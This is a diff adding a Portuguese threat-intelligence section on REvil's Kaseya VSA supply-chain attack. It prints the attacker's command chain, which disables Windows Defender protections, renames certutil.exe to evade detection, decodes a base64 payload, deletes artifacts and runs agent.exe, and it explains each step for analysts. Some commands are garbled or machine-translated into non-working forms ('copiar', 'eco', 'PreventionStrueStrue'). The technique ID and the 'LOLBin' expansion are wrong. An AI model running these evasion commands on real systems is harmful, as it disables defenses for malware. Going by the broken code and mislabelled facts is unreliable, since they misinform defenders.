@@ -156,10 +156,60 @@ As conexões e parcerias do grupo REvil são áreas de interesse na investigaç�
 - Fornecedores de Serviços Cibernéticos: O REvil pode ter parcerias com fornecedores de serviços cibernéticos que oferecem suporte técnico, serviços de hospedagem de infraestrutura de comando e controle (C&C) e outras ferramentas e recursos necessários para conduzir seus ataques. Isso pode incluir provedores de serviços na dark web que oferecem serviços de anonimato e hospedagem de sites.
 - Possíveis Conexões com Outros Grupos Cibercriminosos: O grupo REvil pode ter conexões ou associações com outros grupos cibercriminosos que compartilham informações, ferrament
 
-### TABELA MITRE ATT&CK
+
+## 8.2 Requisição de Inteligência
+
+### 8.2.1 Fluxo do Ataque a Kaseya
+
+O método de acesso inicial para clientes Kaseya é o Supply Chain Commitment TTP (MITRE ATT&CK) T1059.002. A plataforma Kaseya VSA envia um arquivo codificado em base64 (agent.crt) na pasta “C:\kworking” para o cliente. Este arquivo será usado para atualizar o 'Kaseya VSA Hotfix'.
+
+O seguinte comando do PowerShell iniciou o arquivo “C:\Program Files (x86)\Kaseya\ <ID>\AgentMon.exe” na plataforma Kaseya VSA. O ator da ameaça REvil usa o PowerShell como seu modus operandi.
+
+```bash
+"C:\WINDOWS\system32\cmd.exe" /c ping 127.0.0.1 -n 4979 > nul & C:\Windows\ System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference 
+DisableRealtimeMonitoring $true -PreventionStrueStrue true -DisableIOAVProtection 
+$true -DisableScriptScan $true -EnableControlledFolderAccess Desativado EnableNetworkProtection AuditMode -Force -MAPSDisable Report -
+SubmitSamplesConsent NeverSend & copy /Y C:\Windows\System32\cert%C. > C:\ Windows\cert.exe & C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\    agent.exe & del /q /f c:\kworking\agent.crt C:\Windows\cert.exe & c:\kworking\agent.exe
+```
+
+Este comando primeiro desabilitará a proteção em tempo real do Windows Defender:
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference DisableRealtimeMonitoring $true
+```
+
+O comando do PowerShell desabilitará algumas funcionalidades do Windows Defender:
 
 
+- “DisableIOAVProtection $true”: Desativa a verificação de arquivos baixados e anexados.
+- “DisableScriptScanning $true”: Desativa a verificação de scripts durante a verificação de malware.
+- “EnableControlledFolderAccess Disabled”: Desativa a proteção de dados no sistema operacional contra aplicativos maliciosos e ameaças, como ransomware. A funcionalidade de "acesso controlado a pastas" está incluída no Windows 10 e no Windows Server 2019.
+- “Enable NetworkProtection AuditMode -Force”: Neste modo, mostra quais endereços IP e domínios podem ser bloqueados, mas não bloqueia esses endereços IP e domínios perigosos.
+- “MAPSReporting desativado”: Desativa a integração com o Microsoft Proactive Protection Services (MAPS).
+- “SubmitSamplesConsent NeverSend”: Impede que o Windows Defender envie amostras para a Microsoft.
 
+Depois de desabilitar os recursos de segurança do Windows Defender, o comando PowerShell criará uma cópia do utilitário certutil.exe na pasta “C: Windows” chamada cert.exe. O grupo REvil usa o arquivo cert.exe para escapar das regras de descoberta usando cloaking. Os agentes de ameaças costumam usar programas nativos do Windows em suas operações para contornar os controles de segurança de proteção. Rundll32.exe, cmd.exe e certutil.exe são alguns desses programas raiz.
 
+certutil.exe é um arquivo binário do Windows usado para manipular certificados. Os agentes de ameaças usam certutil.exe como um binário "Life Outside the World" (LOLBin) para fins maliciosos. À medida que aumenta o uso de programas de sistema legítimos, as ferramentas de segurança podem monitorar nomes de programas em tempo real para detectar uso suspeito. Para evitar esta detecção, os agentes maliciosos renomeiam os programas nativos do sistema operacional.
 
+```bash
+copiar /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe
+```
+O comando do PowerShell adicionará caracteres aleatórios ao final de cert.exe para evitar que os sistemas de segurança encontrem o executável com base em regras de hash:
+
+```bash
+eco %RANDOM% >> C:\Windows\cert.exe
+```
+O comando então decodifica o arquivo Agent.crt codificado em base64 e o salva como Agent.exe:
+
+```bash
+C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe
+```
+
+O comando do PowerShell exclui os arquivos Agent.crt e cert.exe para remover artefatos gerados no sistema da vítima:
+
+```bash
+del /q /f c:\kworking\agent.crt C:\Windows\cert.exe
+```
+Por fim, o comando PowerShell executa o arquivo Agent.exe, assinado digitalmente com um certificado válido da "PB03 TRANSPORT LTD".
 
